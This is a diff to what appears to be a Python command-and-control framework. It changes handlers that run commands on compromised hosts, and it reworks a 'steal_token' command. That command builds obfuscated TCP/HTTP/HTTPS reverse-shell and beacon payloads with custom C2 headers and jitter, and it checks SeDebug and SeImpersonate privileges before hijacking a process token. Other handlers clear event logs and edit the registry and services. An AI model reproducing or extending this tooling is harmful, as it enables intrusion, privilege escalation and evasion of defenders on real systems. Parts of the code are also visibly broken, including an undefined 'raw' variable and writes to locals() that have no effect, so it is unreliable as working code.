@@ -7,8 +7,10 @@ import textwrap
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from core.session_handlers import session_manager
 from core import shell
-from core import payload_generator as generate
 import core.listeners.tcp_listener as tcp_listener
+
+from core.payload_generator.payload_generator import *
+from core.payload_generator.common import malleable_c2 as malleable
 
 
 from colorama import init, Fore, Style
@@ -60,7 +62,7 @@ def sysinfo(sid, os_type):
     if sess.transport.lower() in ("http", "https"):
         return shell.run_command_http(sid, cmd) or None
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=1.0) or None
+        return shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True) or None
 
 def ps(sid, os_type):
     """
@@ -95,7 +97,7 @@ def ps(sid, os_type):
     if sess.transport.lower() in ("http", "https"):
         return shell.run_command_http(sid, cmd) or None
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=1.0) or None
+        return shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True) or None
 
 def getuid(sid, os_type):
     """
@@ -115,7 +117,7 @@ def getuid(sid, os_type):
     if sess.transport.lower() in ("http", "https"):
         return shell.run_command_http(sid, cmd) or None
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=0.5) or None
+        return shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True) or None
 
 def getprivs(sid, os_type):
     """
@@ -137,7 +139,7 @@ def getprivs(sid, os_type):
     if sess.transport.lower() in ("http", "https"):
         return shell.run_command_http(sid, cmd) or None
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=1.0) or None
+        return shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True) or None
 
 def getpid(sid, os_type):
     """
@@ -160,7 +162,7 @@ def getpid(sid, os_type):
         return shell.run_command_http(sid, cmd) or None
 
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=0.5) or None
+        return shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True) or None
 
 def getenv(sid, os_type, *vars):
     """
@@ -192,7 +194,7 @@ def getenv(sid, os_type, *vars):
     if sess.transport.lower() in ("http", "https"):
         return shell.run_command_http(sid, cmd) or None
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=0.5) or None
+        return shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True) or None
 
 def exec(sid, os_type, *cmd_parts):
     """
@@ -213,7 +215,7 @@ def exec(sid, os_type, *cmd_parts):
     if sess.transport.lower() in ("http","https"):
         out = shell.run_command_http(sid, cmd)
     else:
-        out = shell.run_command_tcp(sid, cmd, timeout=0.5)
+        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True)
 
     return out or ""
 
@@ -238,7 +240,7 @@ def kill(sid, os_type, pid_str):
     if sess.transport.lower() in ("http","https"):
         out = shell.run_command_http(sid, cmd)
     else:
-        out = shell.run_command_tcp(sid, cmd, timeout=1.0)
+        out = shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True)
 
     if out is None:
         return brightgreen + f"[*] Sent terminate to PID {pid_str}"
@@ -263,7 +265,7 @@ def getsid(sid, os_type):
     if sess.transport.lower() in ("http","https"):
         out = shell.run_command_http(sid, cmd)
     else:
-        out = shell.run_command_tcp(sid, cmd, timeout=0.5)
+        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True)
 
     return out or ""
 
@@ -312,9 +314,9 @@ def clearev(sid, os_type, force=False):
 
     # Dispatch
     if sess.transport.lower() in ("http", "https"):
-        out = shell.run_command_http(sid, ps_cmd, timeout=3)
+        out = shell.run_command_http(sid, ps_cmd)
     else:
-        out = shell.run_command_tcp(sid, ps_cmd, timeout=3)
+        out = shell.run_command_tcp(sid, ps_cmd, timeout=3, portscan_active=True)
 
     return out or brightgreen + "[*] Event logs cleared."
 
@@ -336,7 +338,7 @@ def localtime(sid, os_type):
         out = shell.run_command_http(sid, cmd)
 
     else:
-        out = shell.run_command_tcp(sid, cmd)
+        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True)
     
     return out or None
 
@@ -358,7 +360,7 @@ def reboot(sid, os_type):
         out = shell.run_command_http(sid, cmd)
 
     else:
-        out = shell.run_command_tcp(sid, cmd)
+        out = shell.run_command_tcp(sid, cmd, timeout=3, portscan_active=True)
     
     return out or None
 
@@ -389,7 +391,7 @@ def pgrep(sid, os_type, pattern):
         out = shell.run_command_http(sid, cmd)
 
     else:
-        out = shell.run_command_tcp(sid, cmd)
+        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True)
     
     return out or None
 
@@ -418,7 +420,7 @@ def pkill(sid, os_type, pattern):
         out = shell.run_command_http(sid, cmd)
 
     else:
-        out = shell.run_command_tcp(sid, cmd)
+        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True)
     
     return out or None
 
@@ -455,7 +457,7 @@ def suspend(sid, os_type, pid_str):
     if sess.transport.lower() in ("http","https"):
         out = shell.run_command_http(sid, ps_cmd)
     else:
-        out = shell.run_command_tcp(sid, ps_cmd, timeout=2.0)
+        out = shell.run_command_tcp(sid, ps_cmd, timeout=2.0, portscan_active=True)
 
     if out == "0":
         return brightgreen + f"[*] PID {pid_str} successfully suspended"
@@ -497,7 +499,7 @@ def resume(sid, os_type, pid_str):
     if sess.transport.lower() in ("http","https"):
         out = shell.run_command_http(sid, ps_cmd)
     else:
-        out = shell.run_command_tcp(sid, ps_cmd, timeout=2.0)
+        out = shell.run_command_tcp(sid, ps_cmd, timeout=2.0, portscan_active=True)
 
     if out == "0":
         return brightgreen + f"[*] PID {pid_str} successfully resumed"
@@ -540,7 +542,7 @@ def shutdown(sid, os_type, *args):
     if sess.transport.lower() in ("http","https"):
         out = shell.run_command_http(sid, cmd)
     else:
-        out = shell.run_command_tcp(sid, cmd, timeout=5.0)
+        out = shell.run_command_tcp(sid, cmd, timeout=5.0, portscan_active=True)
 
     return out or brightgreen + "[*] Shutdown/reboot issued."
 
@@ -599,7 +601,7 @@ def reg(sid, os_type, action, hive, key_path, value_name=None, value_data=None):
     if sess.transport.lower() in ("http", "https"):
         return shell.run_command_http(sid, cmd) or None
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=3.0) or None
+        return shell.run_command_tcp(sid, cmd, timeout=3.0, portscan_active=True) or None
 
 def services(sid, os_type, action=None, svc_name=None):
     """
@@ -646,7 +648,7 @@ def services(sid, os_type, action=None, svc_name=None):
 
     out = (shell.run_command_http(sid, ps_cmd) 
            if sess.transport.lower() in ("http","https") 
-           else shell.run_command_tcp(sid, ps_cmd, timeout=5.0)
+           else shell.run_command_tcp(sid, ps_cmd, timeout=5.0, portscan_active=True)
           ) or ""
 
     # handle list
@@ -688,7 +690,7 @@ def netusers(sid, os_type):
         return shell.run_command_http(sid, cmd) or None
 
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=1.0) or None
+        return shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True) or None
 
 def netgroups(sid, os_type):
     """
@@ -710,7 +712,7 @@ def netgroups(sid, os_type):
         return shell.run_command_http(sid, cmd) or None
 
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=1.0) or None
+        return shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True) or None
 
 def steal_token(sid, os_type, *args):
     global page_count
@@ -739,37 +741,161 @@ def steal_token(sid, os_type, *args):
     except IndexError:
         return "Error: you must specify a value after -p"
 
-    # now build a parser tailored to that payload
-    parser = argparse.ArgumentParser(prog='steal_token', add_help=False)
-    parser.add_argument('pid', type=int)
-    parser.add_argument('-f','--format', choices=['ps1'], required=True)
-    parser.add_argument('-p','--payload', choices=['tcp-win','http-win','https-win'], required=True)
-    parser.add_argument('-lh','--local_host', required=True)
-    parser.add_argument('-lp','--local_port', type=int, required=True)
-    parser.add_argument('-x','--http_port', type=int, required=True, help="Port for the staging HTTP(S) server")
-    parser.add_argument('--serve_https', action='store_true', help="Serve over HTTPS instead of HTTP")
-    parser.add_argument('--ssl', action='store_true')
-    parser.add_argument('-obs', type=int, choices=[1,2,3], default=0)
+    if payload_type == "tcp":
+        parser = argparse.ArgumentParser(prog='steal_token', add_help=False)
+        parser.add_argument('pid', type=int)
+        parser.add_argument("-f", "--format", choices=["ps1", "bash"], required=True)
+        parser.add_argument('-x','--http_port', type=int, required=True, help="Port for the staging HTTP(S) server")
+        parser.add_argument('--serve_https', action='store_true', help="Serve over HTTPS instead of HTTP")
+        parser.add_argument("-obs", "--obfuscation", type=int, choices=[1, 2, 3], default=False, required=False)
+        parser.add_argument("--ssl", dest="ssl", action="store_true", help="Use SSL/TLS for the TCP reverse shell payload", required=False)
+        parser.add_argument("-p", "--payload", choices=["tcp"], required=True)
+        parser.add_argument("-o", "--output", required=False)
+        parser.add_argument("--os", choices=["windows","linux"], default=False, help="Target OS for the payload", required=False)
+        parser.add_argument("-lh", "--local_host", required=True)
+        parser.add_argument("-lp", "--local_port", required=True)
 
-    # only HTTP(S) needs a beacon interval
-    if payload_type in ('http-win','https-win'):
-        parser.add_argument('--beacon_interval', type=int, required=True)
+    elif payload_type == "http":
+        parser = argparse.ArgumentParser(prog='steal_token', add_help=False)
+        parser.add_argument('pid', type=int)
+        parser.add_argument("-f", "--format", choices=["ps1", "bash"], required=True)
+        parser.add_argument("-obs", "--obfuscation", type=int, choices=[1, 2, 3], default=False, required=False)
+        parser.add_argument("-p", "--payload", choices=["http"], required=True)
+        parser.add_argument("-o", "--output", required=False)
+        parser.add_argument('-x','--http_port', type=int, required=True, help="Port for the staging HTTP(S) server")
+        parser.add_argument('--serve_https', action='store_true', help="Serve over HTTPS instead of HTTP")
+        parser.add_argument("--jitter", type=int, default=0, help="Jitter percentage to randomize beacon interval (e.g., 30 = ±30%)")
+        parser.add_argument("-H", "--headers", dest="headers", action="append", type=malleable.parse_headers, help="Custom HTTP header; either 'Name: Value' or JSON dict")
+        parser.add_argument("--useragent", required=False, help="Custom User-Agent string")
+        parser.add_argument("--accept", required=False, default=False, help="Set the Accept header value")
+        parser.add_argument("--range", required=False, default=False, help="Set the Range header value (e.g., 'bytes=0-1024')")
+        parser.add_argument("--os", choices=["windows","linux"], default=False, help="Target OS for the payload", required=False)
+        parser.add_argument("-lh", "--local_host", required=True)
+        parser.add_argument("-lp", "--local_port", required=True)
+        parser.add_argument("--beacon_interval", required=True)
+
+    elif payload_type == "https":
+        parser = argparse.ArgumentParser(prog='steal_token', add_help=False)
+        parser.add_argument('pid', type=int)
+        parser.add_argument("-f", "--format", choices=["ps1", "bash"], required=True)
+        parser.add_argument("-obs", "--obfuscation", type=int, choices=[1,2,3], default=False, required=False)
+        parser.add_argument("-p", "--payload", choices=["https"], required=True)
+        parser.add_argument("-o", "--output", required=False)
+        parser.add_argument('-x','--http_port', type=int, required=True, help="Port for the staging HTTP(S) server")
+        parser.add_argument('--serve_https', action='store_true', help="Serve over HTTPS instead of HTTP")
+        parser.add_argument("--jitter", type=int, default=0, help="Jitter percentage to randomize beacon interval (e.g., 30 = ±30%)")
+        parser.add_argument("-H", "--headers", dest="headers", action="append", type=malleable.parse_headers, help="Custom HTTP header; either 'Name: Value' or JSON dict")
+        parser.add_argument("--useragent", required=False, default=False, help="Custom User-Agent string")
+        parser.add_argument("--accept", required=False, default=False, help="Set the Accept header value")
+        parser.add_argument("--range", required=False, default=False, help="Set the Range header value (e.g., 'bytes=0-1024')")
+        parser.add_argument("--os", choices=["windows","linux"], default="windows", help="Target OS for the payload", required=False)
+        parser.add_argument("-lh", "--local_host", required=True)
+        parser.add_argument("-lp", "--local_port", required=True)
+        parser.add_argument("--beacon_interval", required=True)
+
+    else:
+        print(brightred + f"Unknown payload type: {payload_type}")
 
     try:
-        opts = parser.parse_args(parts)
+        args = parser.parse_args(parts[1:])
+        all_headers = {}
+
+        if payload_type in ("http", "https"):
+            useragent = args.useragent
+            accept = args.accept
+            byte_range = args.range
+
+        else:
+            useragent = None
+            accept = None
+            byte_range = None
+
+        if payload_type in ("http", "https"):
+
+            if getattr(args, "headers", None):
+                for hdr in args.headers:
+                    all_headers.update(hdr)
+
+                # Header keys to normalize and extract
+                key_map = {
+                     "user-agent": "useragent",
+                    "accept": "accept",
+                    "range": "byte_range"
+                }
+
+                for k, var_name in key_map.items():
+                    found_keys = [h for h in all_headers if h.lower() == k]
+
+                    if found_keys:
+                        if locals()[var_name] is False:  # Not explicitly set via flag
+                            locals()[var_name] = all_headers[found_keys[0]]
+
+                        for key in found_keys:
+                            del all_headers[key]
+
+            else:
+                all_headers = {}
+
     except SystemExit:
-        return parser.format_usage()
+        print(brightyellow + utils.gunnershell_commands["steal_token"])
 
-    # From here on you can safely use opts.beacon_interval for http-win/https-win,
-    # and it won’t exist (or is None) for tcp-win.
-    if opts.payload == 'tcp-win':
-        full = generate.generate_windows_powershell_tcp(opts.local_host, opts.local_port, opts.obs, opts.ssl, True)
 
-    elif opts.payload == 'http-win':
-        full = generate.generate_windows_powershell_http(opts.local_host, opts.local_port, opts.beacon_interval, opts.obs)
+    if payload_type == "tcp":
+        if args.ssl:
+            args.ssl = True
+            ssl = args.ssl
 
-    else:  # https-win
-        full = generate.generate_windows_powershell_https(opts.local_host, opts.local_port, opts.beacon_interval, opts.obs)
+        else:
+            args.ssl = False
+            ssl = args.ssl
+
+    else:
+        ssl = False
+
+    if payload_type not in ("http", "https"):
+        beacon_interval = False
+
+    else:
+        beacon_interval = args.beacon_interval
+
+    if payload_type in ("http", "https"):
+        jitter = getattr(args, "jitter", 0)
+
+    else:
+        jitter = None
+
+    if args.obfuscation == False:
+        obfuscation = 0
+
+    else:
+        obfuscation = args.obfuscation
+
+    try:
+        os_type = args.os.lower()
+        format_type = args.format.lower()
+
+    except Exception as e:
+        print(brightred + f"[!] The --os and -f arguments are required: {e}")
+
+    if os_type == "windows":
+        full = generate_payload_windows(args.local_host, args.local_port, obfuscation, ssl, format_type, payload_type, beacon_interval, headers=all_headers, useragent=useragent, accept=accept, byte_range=byte_range, jitter=jitter)
+
+    elif os_type == "linux":
+        full = generate_payload_linux(args.local_host, args.local_port, obfuscation, ssl, format_type, payload_type, beacon_interval, headers=all_headers, useragent=useragent, accept=accept, range=byte_range, jitter=jitter)
+
+    else:
+        print(brightred + f"[!] Unsupported operating system selected!")
+
+    if args.output:
+        try:
+            with open(args.output, "w") as f:
+                f.write(raw)
+
+        except Exception as e:
+            print(brightred + f"[!] Failed to open local file {args.output}: {e}")
+
+        print(brightgreen + f"[+] Payload written to {args.output}")
+        
 
     priv_check = """$ErrorActionPreference='Continue'; $reqs=@('SeDebugPrivilege','SeImpersonatePrivilege','SeAssignPrimaryTokenPrivilege'); $have=whoami /priv|Select-String 'Enabled'|%{($_ -split '\\s+')[0]}; $ok=$true; foreach($r in $reqs){ if($have -contains $r){ Write-Output "HAS $r" } else { Write-Output "MISSING $r"; $ok=$false } }; if($ok){ Write-Output 'SUCCESS' }"""
     
@@ -777,7 +903,7 @@ def steal_token(sid, os_type, *args):
     display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
 
     if sess.transport in ("tcp", "tls"):
-        out = shell.run_command_tcp(sid, priv_check, timeout=0.5)
+        out = shell.run_command_tcp(sid, priv_check, timeout=0.5, portscan_active=True)
 
     elif sess.transport in ("http", "https"):
         out = shell.run_command_http(sid, priv_check)
@@ -1071,7 +1197,7 @@ def _do_steal_and_launch(sid, pid, ps_payload):
         return shell.run_command_http(sid, ps_payload)
 
     elif sess.transport in ("tcp", "tls"):
-        return shell.run_command_tcp(sid, ps_payload, timeout=0.5)
+        return shell.run_command_tcp(sid, ps_payload, timeout=0.5, portscan_active=True)
 
     else:
         return brightred + f"[!] Unsupported session type!"
